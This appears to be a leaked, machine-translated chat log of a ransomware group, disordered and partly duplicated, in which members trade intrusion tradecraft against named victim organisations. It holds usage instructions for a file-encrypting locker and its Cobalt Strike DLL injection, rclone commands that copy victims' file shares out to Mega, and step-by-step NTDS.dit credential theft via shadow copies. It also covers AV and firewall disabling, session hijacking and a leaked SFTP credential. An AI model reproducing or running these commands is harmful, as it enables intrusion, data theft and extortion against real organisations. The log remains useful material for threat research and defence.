+	From: user9
+	Message: you can try throwing a dll there
+Date: 2020-12-07T19:17:31.751Z
+	From: user9
+	Message: yes, tpsh doesn’t work right there, I don’t think it will work there either
+Date: 2020-12-07T19:17:09.657Z
+	From: tl1
+	Message: what if you pass the load in tpsh through the psec command?
+Date: 2020-12-07T19:16:42.512Z
+	From: user9
+	Message: ```
+	tried windows/smb/psexec with these creds, session dies
+
+Date: 2020-12-07T11:44:56.098Z
+From: user7
+Message: `History of my migration between domains`
+System` rights flies to me, opened a list of precesses and injected to the admin, took a list of hosts on another domain and tried to determine where the DA was authorized through the command `shell dir \\[ip]\C$\Users`, seeing that the list of directories I uploaded a dll and launched it via vmik, at first (on Friday) the process started but the session didn’t arrive, today I tried again with a recreated dll and the session arrived, and then, as usual, a hashdump + mimic and an attempt to jump to DC, everything is over, we part
+
+Date: 2020-12-09T15:52:12.436Z	
+	From: user9
+	Message: ```
+	devry.edu
+	not attracted (with a high probability some piece of iron block traffic)
+	Tpsh was attracted, but it makes sense if I have psh on rdp
+	attracted by the MSF, raised the system on a virtual machine
+	tried to scan the network, a session with a route or forwarding dies almost immediately
+	also when brute on LA - route and portfwd kill the session
+	I tried on LA, each time re-raising the session, there is LA only on the same useless virtual machines
+	ms 17 immediately kills
+	lifted hell
+	
+Date: 2020-12-14T18:51:48.721Z
+From: rosette
+Message: here is your way out
+
+Date: 2020-12-14T18:51:43.066Z
+From: rosette
+Message: ```
+lock.exe -nomutex -p \\host\path
+```
+
+Date: 2020-12-14T18:51:34.292Z
+From: rosette
+Message: ```Launch options:
+-m[all/net/local]
+all - Encrypt all (Default)
+net - only encrypt network resources
+local - only encrypt local files
+
+usage example:
+lock.exe -m all or lock.exe
+lock.exe -m local
+lock.exe -m net
+
+run example:
+lock.exe -h C:\hosts.txt
+
+-nomutex
+Disables mutex protection against double triggering.
+
+-size[10/15/20/25/30/35/40/45/50/60/70/80]
+This parameter determines how much % of the file will be encrypted (50% by default), the file is encrypted in different places in chunks.
+In this case, databases are encrypted by 100%, vm files by 20%, regardless of the parameter value.
+
+example:
+lock.exe -size 35
+
+-p[path]
+When using this parameter, the locker will encrypt files at the specified path
+It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.
+
+example:
+lock.exe -nomutex -p C:\path
+lock.exe -nomutex -p C:\path2
+lock.exe -nomutex -p \\host\path
+
+-log [path to log file]
+Enables error logging
+Usage example:
+lock.exe -log C:\log.txt
+
+All parameters can be combined with each other, the order is not important. If the locker is launched through the command line, then run it as an administrator (If you have rights).
+```
+Date: 2020-12-14T18:50:30.303Z
+From: rosette
+Message: no mount
+
+Date: 2020-12-14T18:50:28.231Z
+From: rosette
+Message: then there is a separate command on the remote path
+Date: 2020-12-14T18:10:49.920Z
+From: rosette
+Message: it's best to take a Dedik in the US, hang up a virtual machine there and so localize. Yes
+
+Date: 2020-12-14T18:10:35.492Z
+From: rosette
+Message: one file in 100gb count how long it will take to locate
+
+Date: 2020-12-14T18:10:26.213Z
+From: rosette
+Message: like 10Mbps
+
+Date: 2020-12-14T18:10:24.578Z
+From: rosette
+Message: + test how fast - sometimes outside speed is slow
+
+Date: 2020-12-14T18:10:08.566Z
+From: rosette
+Message: you need to stop sevrises that occupy files
+
+Date: 2020-12-14T19:43:09.261Z
+From: rosette
+Message: ```
+Mounting a network drive:
+net use x: \\%computername%\c$ /user:%domain%\%user% %password%
+
+Unmounting a network drive:
+net use x: /delete /Yes
+instead of X - a letter
+
+Date: 2020-12-14T11:27:58.573Z
+From: alter
+Message: ```
+but there is no tricky way to cut and localize disks from the exsi server?)
+```
+only if the smb of the ball is on the nix machine where these disks are
+```
+I tried different ones - they write either the old one or the new one is needed
+```
+only by testing
+```
+But there are solutions for the form grabber on the sharp under the koba?
+```
+Formgrabber cannot be implemented on Sharp, these are browser hooks, a very dirty method and a keylogger is more convenient + stealer, the formgrabber is essentially meaningless in the presence of a keylog / steelak
+
+Date: 2020-12-14T11:18:48.665Z
+From: Bug
+Message: are there any solutions for a form grabber on a sharp for a kobu?
+
+Date: 2020-12-20T21:26:42.625Z
+From: t3chnolog
+Message: in general, don't give a fuck about obfuscation, he looks at the execution of the code after deobfuscation, i.e. base64 FOX
+
+Date: 2020-12-20T21:26:33.201Z
+From: Andy
+Message: yes, it seems to me that after launching the dll, they have already arrived there a lot))
+
+Date: 2020-12-20T21:25:49.183Z
+From: t3chnolog
+Message: if adequate people rule the grid, plus or minus, then most likely there is just a notification set up and you will now be herded)
+
+Date: 2020-12-20T21:25:27.512Z
+From: Andy
+Message: before that, all dll and exe fired)
+
+Date: 2020-12-20T21:25:12.995Z
+From: t3chnolog
+Message: even when there is no amsi and av does not fire inside the powershell, the fact that the powershell process is downloading something from the Internet is suspicious
+and when there is amsi (and on server 16 it is) it's just a fucking miracle that you didn't get fucked)
+
+Date: 2021-01-05T12:52:19.088Z	
+	From: tl1
+	Message: while our process is complemented by the following actions:
+	1) remove listings of backups up to 7 levels of nesting
+	2) whine file listings or table structures
+	3) mail server backup
+	4) taking 3-4 backup files from the network
+
+Date: 2021-01-06T20:59:29.234Z	
+	From: user8
+	Message: url, login, password
+Date: 2021-01-06T20:59:20.922Z
+	From: user8
+	Message: edit click
+Date: 2021-01-06T20:58:57.066Z
+	From: user8
+	Message: there is a list
+Date: 2021-01-06T20:58:54.386Z
+	From: user8
+	Message: login
+Date: 2021-01-06T20:58:50.586Z
+	From: user8
+	Message: we go to the site
+Date: 2021-01-06T20:58:40.889Z
+	From: tl1
+	Message: how do you get information from the last pass?
+
+Date: 2021-01-06T20:50:20.646Z	
+	From: user8
+	Message: in #1-done-rtpcompany-com spawnas does not work under any credits, removed shares under current users
+	SharpShares: no listable shares other than print$
+	ShareFinder: where it says Remote Admin - does not let
+	I check lastpass/logmein passwords in #waterway-com, except for mharper, I don’t see anyone else yet, along the way I follow the keylog
+Date: 2021-01-06T20:46:56.252Z
+	From: user3
+	Message: No change, started looking for mozilla on computers where admins are logged in and check keypass password file
+
+Date: 2021-01-07T21:25:07.973Z	
+	From: tl1
+	Message: in EAC, an account with access to a backup must be in a group
+	Date: 2021-01-07T21:24:44.866Z
+	From: tl1
+	Message: in other cases
+	Date: 2021-01-07T21:24:24.688Z
+	From: tl1
+	Message: under the tops these are directors, chief accountants, etc., techies
+Date: 2021-01-07T21:21:52.514Z	
+	From: tl1
+	Message: don’t forget about Tor, because the account stores information about sessions, and you can obviously get there via the web
+Date: 2021-01-11T13:14:44.736Z	
+	From: tl2
+	Message: mmm
+	n't tell you... I usually downloaded just target mailboxes via EAC
+
+Date: 2021-01-14T15:26:36.784Z	
+	From: tl2
+	Message: ```
+	no need for any 7za and mega unarchiving now! everything is very quiet and imperceptible!
+	download rklon from the site. We put rclon.exe in the dira we need, then everything is according to the manual. I did everything through rdp
+	a mega, choose it from a huge list that rklon provides us with . rklon quietly cuts to mega and makes a clone of what you need. you can at least just fs. downloads everything through rklon, so the download speed is high.
+	here is the guide. everything is simple here
+	https://rclone.org/mega/
+	next download command
+	rclone.exe copy "\\FS\" remote:NT -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+	remote:NT - only change this.
+	"remote" is the name of your mega.
+	"NT" is your directory in the mega where it will be downloaded, if it does not exist, it will create it itself.
+	example
+	rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+	
+Date: 2021-01-21T01:10:42.356Z
+From: alter
+Message: @all THIS IS IMPORTANT
+began to notice crooked listeners in other people's cobalts
+It is CORRECT to prescribe the gasket domain both in HTTPS hosts and in HTTPS Host (Stager)
+if you prescribe ipack with HTTS Host (Stager) - the staging process goes "bypassing" the SSL certificate that is on the gasket - which is FUCKING and adds blocking by fireworks
+
+Date: 2021-01-25T17:07:26.853Z	
+	From: tl1
+	Message: ```
+	putty HKCU\Software\SimonTatham\PuTTY\Sessions
+	recursive search *.ppk up to 3rd level in:
+	%USERPROFILE%\Documents
+	%USERPROFILE%\.ssh
+	%USERPROFILE%\Downloads
+	HKCU\Software\SimonTatham\PuTTY\Sessions
+Date: 2021-01-25T16:51:59.337Z	
+	From: user9
+	Message: is there anything to get passwords or sessions from putti? except gopher
+	
+Date: 2021-02-10T18:49:11.625Z
+From: tony
+Message: AdvanceDayPiscanner collects balls normally
+
+Date: 2021-02-10T18:40:12.255Z
+From: rosette
+Message: ```net view \\host
+net view \\host /ALL
+```
+first balls
+the second with local disks
+
+Date: 2021-02-10T18:39:54.376Z
+From: rosette
+Message: never triggered av, but there is a tool for everyone that is not fawn
+
+Date: 2021-02-10T18:39:50.662Z
+From: t3chnolog
+Message: if, for example, the server is 2012 without amsi and we do it through psinject, is there a chance that AB will kill?
+
+Date: 2021-02-10T18:39:15.846Z
+From: t3chnolog
+Message: Is anyone using sharefinder on a regular basis now?
+I'm wondering if it can trigger AV or network proactive
+
+Date: 2020-12-14T19:43:09.261Z
+From: rosette
+Message: ```
+Mounting a network drive:
+net use x: \\%computername%\c$ /user:%domain%\%user% %password%
+
+Unmounting a network drive:
+net use x: /delete /Yes
+instead of X - a letter
+
+Date: 2020-12-11T17:35:57.821Z
+From: alter
+Message: please help a friend to gain a foothold with TOR
+
+Date: 2020-12-25T19:57:36.973Z
+From: Bug
+Message: How can I extract an account from the Acronis Cloud Agent?
+
+Date: 2021-01-19T22:43:56.816Z
+From: rosette
+Message: [ ](https://stylebrooks.com/group/discussion?msg=L6dwAKr2LyBxS7GiC) then control F and ``` Gigabit
+
+Date: 2021-01-19T22:43:38.548Z
+From: rosette
+Message: this type
+exclude
+D.B.
+SQL
+FS
+on DB servers, the Internet is off or there are protective solutions (well, or they should be)
+
+Date: 2021-02-19T13:09:08.548Z
+From: t3chnolog
+Message: if you have troubles with what is fired and thrown out of the network after the ntds dump - try this method
+it can be burned only by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive
+
+Date: 2021-02-19T13:07:04.618Z
+From: t3chnolog
+Message: the trick of this method is that we don’t actually dump anything, we just take and pump out ntds
+in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive
+
+Date: 2021-02-20T14:44:20.152Z
+From: t3chnolog
+Message: ```
+cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\
+```
+this
+
+Date: 2021-02-20T14:44:08.778Z
+From: steven
+Message: throw off the batch file, I'll take a look
+
+Date: 2021-02-20T14:43:56.952Z
+From: steven
+Message: what needs to be obfuscated
+
+Date: 2021-02-20T14:43:37.350Z
+From: t3chnolog
+Message: who has experience in command obfuscation in cmd?
+
+Date: 2021-02-22T18:54:58.990Z
+From: t3chnolog
+Message: ```
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"
+```
+we make a request for a listing of shadow copies, there is an indication of the date, check that there is a fresh date
+almost certainly they are already there, if not, we do it ourselves
+```
+net start Volume Shadow Copy
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+```
+further in the listing of shadow copies we find the latest
+Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
+accordingly we need a copy number for the next command
+```
+shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\ temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c :\temp\log\"
+```
+in c:\temp\log\ files ntds.dit / security / system should fall
+we take a portable console 7z and pack it into an archive with a password
+```
+7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD
+```
+we download the password-protected archive to ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following
+```
+Esentutl /p C:\log\ntds.dit
+
+Date: 2021-01-19T22:43:04.165Z
+From: rosette
+Message: APP
+MAIL
+EXCH
+PUB
+
+Date: 2021-01-19T22:42:45.491Z
+From: rosette
+Message: just select servers
+
+Date: 2021-01-19T22:42:40.596Z
+From: rosette
+Message: make an appeal to each PC
+
+Date: 2021-01-19T22:42:36.056Z
+From: rosette
+Message: ```psexec \\remotecomputer systeminfo
+```
+
+Date: 2021-01-19T22:42:06.801Z
+From: rosette
+Message: script through psekez
+
+Date: 2021-01-19T22:42:00.976Z
+From: rosette
+Message: systeminfo
+
+Date: 2021-01-19T22:41:57.100Z
+From: rosette
+Message: yes
+
+Date: 2021-01-19T22:39:10.980Z
+From: Andy
+Message: does anyone know if it's possible to check cars on the internet channel to find a gig to download
+
+Date: 2021-01-15T18:13:24.029Z
+From: t3chnolog
+Message: Has anyone encountered the fact that it is impossible to enter the web console in the sphere due to the end of support for the flash player?
+
+Date: 2021-01-18T21:33:26.693Z
+From: lexman
+Message: [ ](https://stylebrooks.com/group/discussion?msg=sDY76YDoo3R4YkmjZ) If anyone else needs it, we won like this:
+```
+Adobe Flash Player, when trying to run content in browsers, will redirect everyone to the site where it says the end of support and use the content does not come out.
+But there is a solution, in the latest versions a "time bomb" was sewn up, which is quite simple - just change the date to 01/11/2021 and voila content access
+Vsphere has a login option via flash, they can't get to it - Trent
+
+Date: 2021-01-18T13:51:28.269Z
+From: t3chnolog
+Message: Where-Object {$_.Name -like "ENTER AV NAME HERE"}
+Write-Host "AV_NAME Uninstall Successful... Continuing"
+throw "AV_NAME Uninstall Failed...Exiting"
+
+Date: 2021-01-13T09:35:42.796Z
+From: alter
+Message: for those who need to work with SonicWall through browser sessions
+Using a Web Browser to Access
+```
+- take the session from the script output, for example "47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg="
+- open the browser in incognito mode, open the developer console (js-console)
+- encode the session ID in base64
+>> btoa("47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg=") [ENTER]
+"NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0="
+- drive in the URL https://target (redirect to https://target/cgi-bin/welcome)
+- go to the console in application/cookies, add a cookie
+swap : NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0=
+- in the browser (where .../cgi-bin/welcome) edit the URL to https://target/cgi-bin/portal
+- get access to the resource under the user session
+
+Date: 2021-01-13T12:38:28.023Z
+From: alter
+Message: ```
+ATTENTION: Everything described in this channel is not subject to distribution, copying or publication on any third-party resources.
+
+Things worth remembering and knowing.
+1. A separate build is always generated for each grid, which you need to request by calling @alter in the conf.
+2. In the standard package, the build is issued as an archive that contains an .exe file and two .dll files with different bitness for fileless launch through cobalt sessions.
+3. At the moment, fileless launch bypasses the vast majority of known AV/EDR systems, and no speed loss has been noticed.
+
+Launch parameters:
+
+-m[all/net/local]
+all - Encrypt all (Default)
+net - only encrypt network resources
+local - only encrypt local files
+
+usage example:
+lock.exe -m all or lock.exe
+lock.exe -m local
+lock.exe -m net
+
+run example:
+lock.exe -h C:\hosts.txt
+
+-nomutex
+Disables mutex protection against double triggering.
+
+-size[10/15/20/25/30/35/40/45/50/60/70/80]
+This parameter determines how much % of the file will be encrypted (50% by default), the file is encrypted in different places in chunks.
+In this case, databases are encrypted by 100%, vm files by 20%, regardless of the parameter value.
+
+example:
+lock.exe -size 35
+
+-p[path]
+When using this parameter, the locker will encrypt files at the specified path
+It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.
+
+example:
+lock.exe -nomutex -p C:\path
+lock.exe -nomutex -p C:\path2
+lock.exe -nomutex -p \\host\path
+
+-log [path to log file]
+Enables error logging
+Usage example:
+lock.exe -log C:\log.txt
+
+All parameters can be combined with each other, the order is not important.
+
+Running as a dll via cobaltstrike
+
+Put the files inject.cna massinjector.cna inject_x86.o and inject_x64.o in one folder.
+Load file inject.cna cobaltstrike -> script manager -> load
+
+An example of launching within a single machine where there is a session:
+mandllinject c:\path\locker.dll
+
+Arguments are passed in quotes
+mandllinject c:\path\locker.dll "arguments here"
+
+An example of running at once on X machines where there is a session:
+We select the necessary sessions in a "pack", press RMB and select dllinject from the menu
+In the dialog box that appears, specify the paths to the dlllocker of the necessary bitness and arguments (if any) and confirm.
+
+NOTE:
+It is forbidden to start the locker in normal mode until the process of processing the specified path is completed.
+NOTE
+this is due to the inclusion of noumutex !!!
+
+- What does it mean?
+This means that either you can run the locker with the -nomutex flag any number of times with a path, but there should not be a running locker process WITHOUT a path specified until the "specified" paths are fully processed.
+```
+Date: 2021-01-22T21:13:25.965Z
+From: alter
+Message: ```
+The current version of cobalt is patched with a Java hook where a trial EICAR fingerprint was taken.
+Requires jdk13 on Windows to run:
+Add this to the batch file
+	@echo off
+	pushd %~dp0
+	set PATH="C:\Program Files\Java\jdk-13.0.2\bin\"
+	
+To run on ubuntu:
+start line
+	java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -javaagent:hook.jar -jar cobaltstrike.jar $*
+
+installing the required Java:
+	sudo add-apt-repository ppa:linuxuprising/java
+	sudo apt install oracle-java15-installer
+	
+	java-version
+	java version "15.0.1" 2020-10-20
+	Java(TM) SE Runtime Environment (build 15.0.1+9-18)
+	Java HotSpot(TM) 64-Bit Server VM (build 15.0.1+9-18, mixed mode, sharing)
+
+For those with Kali (Debian):
+https://www.linuxuprising.com/2020/09/how-to-install-oracle-java-15-on-ubuntu.html
+
+there will be a section below
+Install Oracle Java 15 on Ubuntu, Debian, Linux Mint, Pop!_OS, Zorin OS and others using an APT PPA repository
+
+Included in a folder
+	Cobalt42_v2/Toolkits/artifact/brooks-artifact-kit/
+there is an artifact.cna that needs to be imported into cobalt to generate internal native loads and staged loads to run.
+
+At the moment, the situation with detections is as follows:
+https://dyncheck.com/scan/id/eeab696158db737d90da83a0ebf7bc53 - x64 dll
+https://dyncheck.com/scan/id/f656a34930eb682d6cab252798234f7c - service-exe-x64
+https://dyncheck.com/scan/id/32c29f3ba498be4915bb72d4bae824ce - staged payload x64
+
+All these loads are used not only for manually launching files, but also for jump functionality.
+Enjoy, give feedback, wait for updates and patch notes.
+Thanks to all.
+
+Artifact Whale is used in the following cases:
+	* Attacks -> Packages -> Windows Executable
+	* Attacks -> Packages -> Windows Executable (S)
+	* Attacks -> Web Drive-by -> Scripted Web Delivery (bitsadmin and exe)
+	* Beacon's 'elevate svc-exe' command
+	* Beacon's 'jump psexec' and 'jump psexec64' commands
+
+Date: 2021-01-26T18:44:42.019Z
+From: alter
+Message: If you find or stumble upon something else interesting - add it, I will throw it into the general selection.
+but ONLY what uses the native functionality of cobalt, exclusively .CNA files without any additional scripts, otherwise we will litter everything here.
+
+```
+##AV_Query
+AV_Query command Scans the registry for installed antiviruses
+##upload
+Alternative version of the upload command.
+Uploads a local file (first argument) to a remote host (second argument, optional).
+How to use: __upload </local/path/to/file> [/remote/path/to/file]__.
+Usage example: __beacon> upload implant.exe \\DC1\c$\windows\temp\implant.exe__.
+##Blacklist
+Blacklist for bacons. Removes bacon if it is running on a computer where the username and computername are in the blacklist.
+__blacklist-add__ - add to blacklist
+__blacklist-remove__ - remove from blacklist
+__blacklist-show__ - show blacklist
+## Credpocalypse
+Tracks bacons and collects credentials
+Use in bacon:
+__begin_credpocalypse__ 			- keep track of the current bacon
+	__end_credpocalypse [all]__ 		- stop tracking current/all bacons
+	__credpocalypse_interval [time]__ - bacon polling interval 1m, 5m (default), 10m, 30m, 60m
+Usage in console script or other script:
+__begin_credpocalypse__ 			- track all bacons
+	__end_credpocalypse [all]__ 		- stop tracking all bacons
+	__credpocalypse_interval [time]__ - bacon polling interval 1m, 5m (default), 10m, 30m, 60m
+Right click on the bacon to open the Credpocalypse menu
+##powershell2
+Alternative version of powershell command with enhanced operational security
+## Simple Beacon console status bar
+Shows the working directory, change the width of the bacon last occurrence indicator in the lower right corner to a fixed one
+Adds an option to the cd command to return to the previous directory.
+Usage: __cd -__
+## dcom_shellexecute
+Lateral movement with DCOM (ShellExecute)
+Usage: __dcom_shellexecute [target] [listener]__ - create new bacon on target via DCOM ShellExecute object
+##DebugKit
+Additional debugging tools in the DebugKit pop-up menu, console script and in the bacon.
+Commands in the console script:
+__!beaconinfo__ - get information about bacons
+__!loaded_powershell__ - show loaded powershell cmdlets for each bacon
+__!c2_sample_server__ - show how responses from C2 server look like
+__!c2_sample_client__ - show what client requests look like
+__!who__ - show everyone who is connected to the teamserver
+__!pwn3d_hosts__ - show a list of hostnames that have ever created sessions
+__!show_data_keys__ - show keys in Cobalt Strike data model
+__!query_data_key <key_name>__ - get values by key from Cobalt Strike data model
+__!sync_all_downloads__ - synchronizes downloaded files from the Cobalt Strike server to the specified folder and recursively recreates the file paths that the files had on the target hosts
+Usage: __!sync_all_downloads [/path/on/client/machine/to/save/downloads/to] <IP address of host to download files for>__
+Commands in bacon console:
+__!iscsadmin__ - check current bacon via -isadmin function
+##csfm
+Query the database for known commands, provide helpful hints to the operator.
+Syntax: __csfm [List]__ - list all csfm options
+Example: __search computer, tip ntlm__
+##EDR
+Remotely polls the system for EDR products
+Syntax: __edr_query [hostname] [arch]__
+## Color Coded Files Listing
+The script colorizes the output of the ls command and allows you to track downloaded files by highlighting them
+## Forwarded_Ports
+Keeps track of configured remote port forwardings on all bacons and makes it easy to remove them
+Using 'rportfwd' quickly consumes the pool of available local ports from which outgoing traffic is redirected, and keeping track of them manually becomes tedious on long-running projects. This script aims to fill that gap by collecting these commands and presenting them in a beautiful visualization panel.
+## HighLight_Beacons
+Highlights new beacons in green, inactive ones in red.
+## logvis
+Advanced beacon console output visualization.
+## MASS-DCSYNC
+DCSync attack applied to a list of domain users.
+The user list file must contain one user per line.
+
+##MIMIKATZ_ADDONS
+Performs a password change that allows you to change the NTLM password for this account.
+Uses the Mimikatz password change feature, which allows you to change the NTLM password for a given account without logging setpassword events.
+
+**Usage:** password_change [Username] [Known old hash or password] [New hash or password] [SERVER/DC/localhost]
+
+## PING_ALIASES
+1. alias **qping** sends a ping packet using the command line.
+**Usage**: qping [target]. The **target** parameter is optional.
+2. alias **smbscan** scans port 445.
+
+## PORTSCAN_RESULTS
+Menu item in the View section. When launched, a tab opens with the results of smbscan.
+
+##PROCESSCOLOR
+Highlighting process categories (antiviruses, explorer, browsers, current process) in the beacon process manager (Explore => ProcessList).
+
+## PS_WINDOW_ALIASES
+alias **pspane** opens the process manager.
+**Usage:** pspane
+
+## SLEEP_DOWN_WHEN_NO_OPERATORS
+Increases the sleep interval for beacons that do not have active (logged in) users.
+
+## SMART_AUTOPPID
+Redirects execution of beacon commands and all beacon jobs to a designated process (svchost.exe).
+All commands will be executed depending on the context/privilege (user or system).
+**Usage:** autoppid
+
+##WIN2012MIMIKATZ
+Adds a key to the registry for mimikatz to work.
+
+Date: 2021-01-26T17:39:24.197Z
+From: tony
+Message: *Mega is a cloud storage and file hosting service known for its security feature where all files are encrypted locally before they are uploaded. This prevents anyone (including employees of Mega) from accessing the files without knowledge of the key used for encryption.* In general, as I understand it, all files are encrypted locally before being dumped, so there is no need to make encrypted archives.
+
+Date: 2021-01-26T17:03:50.816Z
+From: tony
+Message: then the same vmik can check if the process is running, if so, the program runs ok wmic /node:"HOST" /user:"home\log" /password:"pass" process get description,executablepath
+
+Date: 2021-01-26T17:02:29.460Z
+From: tony
+Message: it's convenient to send the necessary files via sms to remote hosts, and then start vmik
+
+Date: 2021-01-26T17:01:21.435Z
+From: tony
+Message: config after generation can be put next to the exe and run rcclone with the --config parameter for example rc.exe --config C:\Users\Administrator\rc.conf copy "C:\Users\Administrator\" mega:data
+
+Date: 2021-01-26T17:00:07.508Z
+From: tony
+Message: I'll put in my 5 kopecks, remote is the name of the config, cat. you generate via rclone config, if you specify the config name for example mega then it will be mega:data ,
+
+Date: 2021-01-26T16:55:26.870Z
+From: brandon
+Message: ``` guys, I'm telling you how to use rklon:
+1. download the program itself (laid out in general), create a file rclone.conf and put it in the same folder with exe
+2. then open cmd from the admin, fall into the folder where the program with the configuration file lies and execute the command: rclone config
+3. then a menu pops up in which we create a config (roughly speaking, we roll in mega credits), after the credits are rolled in, the program writes them to the rclone.conf file, in encrypted form.
+4. we take the received rclone.conf file and the program itself and put it on the host from which we are going to pull the information, of course it’s better to put it in a secluded place
+5. we fall into the folder where we put the config and the program and execute the command:
+
+shell rclone.exe copy "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+
+well, here I think it’s clear that what’s in quotes is what we’re extorting, we can specify it as you like, even the entire disk
+remote - the name of the config, which we specified when performing step 3, data - the folder in the mega where the info is uploaded
+
+Date: 2021-02-14T19:31:20.739Z
+From: rosette
+Message: 7z
+
+Date: 2021-02-14T18:58:25.907Z
+From: VasyaPypkin
+Message: Salam guys
+There is such a question, does anyone know how to pick up files with read-only access?
+We are talking specifically about custom keys in %APPDATA%\Microsoft\Protect\<SID>\
+Then offline to pull the master key from them
+
+Date: 2021-03-11T16:10:51.741Z
+From: turner
+Message: people, drop the sites where you can watch the rhubarb of Asian companies... almost no one from Asia is on zuminfo
+
+Date: 2021-03-03T18:59:47.248Z
+From: slice
+Message: ```
+Export-PowerViewCSV - thread-safe CSV append
+Resolve-IPAddress - resolves a hostname to an IP
+ConvertTo-SID - converts a given user/group name to a security identifier (SID)
+Convert-ADName - converts object names between a variety of formats
+ConvertFrom-UACValue - converts a UAC int value to human readable form
+Add-RemoteConnection - pseudo "mounts" a connection to a remote path using the specified credential object
+Remove-RemoteConnection - destroys a connection created by New-RemoteConnection
+Invoke-UserImpersonation - creates a new "runas /netonly" type logon and impersonates the token
+Invoke-RevertToSelf - reverts any token impersonation
+Get-DomainSPNTicket - request the kerberos ticket for a specified service principal name (SPN)
+Invoke-Kerberoast - requests service tickets for kerberoast-able accounts and returns extracted ticket hashes
+Get-PathAcl - get the ACLs for a local/remote file path with optional group recursion
+
+Date: 2021-03-06T01:39:54.629Z
+From: cybercat
+Message: If someone did not know, then in the clone you can filter files by date, for example, the --max-age option allows you to specify how old files should NOT be uploaded
+```
+rclone.exe copy --max-age 3y "\\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P
+```
+this command will only download files that are not older than 2018 i.e. 2018-2021
+more details - https://rclone.org/filtering/
+
+Date: 2021-03-05T02:35:19.099Z
+From: cybercat
+Message: and another moment, because I heard from viola that someone did not start the session gopher ps script, this also applies to other ps1 scripts, and to those situations when a server without powershell ISE
+Example: there is a script
+```
+examplescript.ps1
+```
+and in the manual on the github, the launch is indicated as:
+```
+. .\examplescript.ps1
+```
+and then the command
+```
+Invoke-ExampleScript -argument
+```
+you run it and it gives you an error that there is no cmdlet, this is because the cmdlets do not pull up like that (it didn’t work for me in any case)
+this is solved in the following way, change the file extension from .ps1 to .psm1 - we get the powershell plug-in
+open regular powershell
+write
+```
+Import-Module .\examplescript.psm1
+```
+call the function with the next command
+```
+Invoke-ExampleScript -argument
+```
+get a working script
+
+Date: 2021-03-04T18:21:22.335Z
+From: cybercat
+Message: Guys who will knock filezilla from accesses obtained by SessionGopher to servers.
+specify the protocol explicitly, since the port is not explicit, it will be indicated in the output, for example, here is the output of my sessiongofer:
+```
+"COHLAPTOP75\CSoh","Shopbop - Development","z3M>uE/B","sftp.amazonsedi.com","2PD11LSYEWJ90","Use SFTP","2222"
+```
+if you just enter in the host field - sftp.amazonsedi.com you will not connect because the port is not sssh 22 but 2222, you need to specify the protocol in the host explicitly tobish sftp://sftp.amazonsedi.com
+if specified - ```
+Use FTP over TLS if available","21"
+```
+then specifies ftps://hostname
+and so on, here's a reminder just in case:
+```
+ftp:// - for normal ftp connection
+sftp:// - ssh ftp connection
+ftps:// - ftp over ssh (implicit)
+ftpes:// - ftp over ssh (explicit)
+
+Date: 2021-03-20T07:18:50.932Z
+From:ATX
+Message: then look here convert = http://www.hexadecimaldictionary.com/hexadecimal/0xd3d/
+
+Date: 2021-03-20T07:18:37.378Z
+From:ATX
+Message: REG QUERY "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
+
+Date: 2021-03-20T07:18:28.904Z
+From:ATX
+Message: if it doesn't work, check which RDP port is used there
+
+Date: 2021-03-20T07:18:13.489Z
+From:ATX
+Message: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
+netsh firewall set service remoteadmin enable
+netsh firewall set service remote desktop enable
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+exit
+
+Date: 2021-03-20T07:18:12.372Z
+From:ATX
+Message: PSEXEC or WMIexec from the package
+
+Date: 2021-03-20T04:18:35.631Z
+From: Shved
